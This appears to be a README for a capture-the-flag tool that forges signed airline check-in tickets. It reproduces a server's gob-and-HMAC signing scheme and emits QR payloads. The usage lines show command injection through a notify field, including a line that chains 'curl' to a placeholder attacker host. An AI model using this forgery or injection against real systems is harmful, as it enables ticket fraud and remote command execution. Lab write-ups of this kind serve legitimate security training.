# htb-airways ticket forge

Edits the ticket JSON, re-signs, emits the url-encoded QR payload.
Reproduces the server's exact encoding (verified byte-for-byte + sig match).

Signing:
  iface   = &VerifyTicketAuthenticity{Data: []byte(json)}   // POINTER, Data is []byte
  gob name = "*gob.VerifyTicketAuthenticity"                 // server registered the pointer type
  envelope = gob.Encode(&iface)
  payload  = urlencode( base64( envelope || HMAC-SHA256(TICKET_VALIDATION_TOKEN, envelope) ) )

## build
    go build -o forge-ticket .

## use
    ./forge-ticket -notify 'id'
    ./forge-ticket -notify 'id; curl http://YOUR_IP/x'       # if NotifyCmd hits a shell
    ./forge-ticket -json '{"PNR":...}'
    ./forge-ticket -url 'https://TARGET/checkin?ticket=' -notify '...'

## QR (Arch: pacman -S qrencode)
    ./forge-ticket -notify 'id' | qrencode -o ticket.png

## verify encoding matches the server exactly
    go test -run TestExactMatch -v
